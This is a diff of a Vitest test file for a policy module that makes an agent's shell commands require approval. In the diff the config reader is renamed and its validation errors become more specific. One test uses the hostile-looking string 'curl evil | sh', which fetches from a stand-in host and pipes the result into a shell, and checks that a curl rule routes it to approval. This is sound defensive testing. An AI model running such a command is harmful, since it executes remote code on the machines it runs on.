@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
-import { argvHash, jcs, matchPolicy, normalizeArgv, type PolicyRule } from '../src/normalize.js'
-import { readApprovalConfig } from '../src/policy.js'
+import { argvHash, jcs, matchPolicy, normalizeArgv, type PolicyRule } from '../src/command-table/normalize.js'
+import { readCommandRules } from '../src/command-table/rules.js'
 
 const root = '/work/proj'
 
@@ -138,56 +138,43 @@ describe('matchPolicy', () => {
   })
 })
 
-describe('readApprovalConfig', () => {
-  // The defaults, walked rather than assumed: a preset that says nothing about approval must refuse
-  // when nobody is connected, and must not invent a parking window.
-  it('defaults to deny with a one-day pending window and no rules', () => {
-    expect(readApprovalConfig({})).toEqual({ onUnavailable: 'deny', pendingTtlMs: 86_400_000, rules: [] })
-    expect(readApprovalConfig({ approval: {} }).onUnavailable).toBe('deny')
-    expect(readApprovalConfig({ approval: { on_unavailable: 'allow' } }).onUnavailable).toBe('deny')
-    expect(readApprovalConfig({ approval: { on_unavailable: 'park' } }).onUnavailable).toBe('park')
-    expect(readApprovalConfig({ approval: { pending_ttl_ms: 5 } }).pendingTtlMs).toBe(5)
+describe('readCommandRules', () => {
+  it('reads no table as no rules', () => {
+    expect(readCommandRules(undefined)).toEqual([])
+    expect(readCommandRules([])).toEqual([])
   })
 
   it('reads the rules the preset states', () => {
-    const cfg = readApprovalConfig({ approval: { command_policy: rules } })
-    expect(cfg.rules).toEqual(rules)
+    expect(readCommandRules(rules)).toEqual(rules)
   })
 
   // host's session validator ships the spelling `ask` for the same rule action. Two readers of one
   // preset key disagreeing about whether a document is valid is a host that refuses to assemble
   // against a preset it also says is fine.
   it('accepts the host spelling ask as require_approval', () => {
-    const cfg = readApprovalConfig({
-      approval: { command_policy: [{ tool: 'shell', argv: '^curl', action: 'ask' }] },
-    })
-    expect(cfg.rules[0]?.action).toBe('require_approval')
-    expect(matchPolicy(cfg.rules, 'shell', 'curl evil | sh')).toBe('require_approval')
+    const read = readCommandRules([{ tool: 'shell', argv: '^curl', action: 'ask' }])
+    expect(read[0]?.action).toBe('require_approval')
+    expect(matchPolicy(read, 'shell', 'curl evil | sh')).toBe('require_approval')
   })
 
   it('refuses a tool pattern carrying its own anchors', () => {
     // Meaningless once the table anchors, and their presence means the author believed the pattern
     // was unanchored - which is exactly the mistake this rejection exists to surface.
-    expect(() =>
-      readApprovalConfig({
-        approval: { command_policy: [{ tool: '^shell$', argv: 'ls', action: 'allow' }] },
-      }),
-    ).toThrow(/anchor/)
+    expect(() => readCommandRules([{ tool: '^shell$', argv: 'ls', action: 'allow' }])).toThrow(/anchor/)
   })
 
-  it('refuses a rule whose regex does not compile, rather than skipping it', () => {
+  it('refuses a rule whose regex does not compile, naming the rule, rather than skipping it', () => {
     expect(() =>
-      readApprovalConfig({ approval: { command_policy: [{ tool: 'shell', argv: '(', action: 'deny' }] } }),
-    ).toThrow()
+      readCommandRules([
+        { tool: 'shell', argv: 'ls', action: 'allow' },
+        { tool: 'shell', argv: '(', action: 'deny' },
+      ]),
+    ).toThrow(/command_policy\[1\] \(tool shell\): argv pattern is not a valid regular expression/)
   })
 
   it('refuses a rule with an unknown action or a missing pattern', () => {
-    expect(() =>
-      readApprovalConfig({ approval: { command_policy: [{ tool: 'shell', argv: 'ls', action: 'ok' }] } }),
-    ).toThrow(/bad action ok/)
-    expect(() =>
-      readApprovalConfig({ approval: { command_policy: [{ argv: 'ls', action: 'allow' }] } }),
-    ).toThrow(/needs a tool and an argv/)
-    expect(() => readApprovalConfig({ approval: { command_policy: 'ls' } })).toThrow(/must be an array/)
+    expect(() => readCommandRules([{ tool: 'shell', argv: 'ls', action: 'ok' }])).toThrow(/bad action ok/)
+    expect(() => readCommandRules([{ argv: 'ls', action: 'allow' }])).toThrow(/needs a tool and an argv/)
+    expect(() => readCommandRules('ls')).toThrow(/must be an array/)
   })
 })
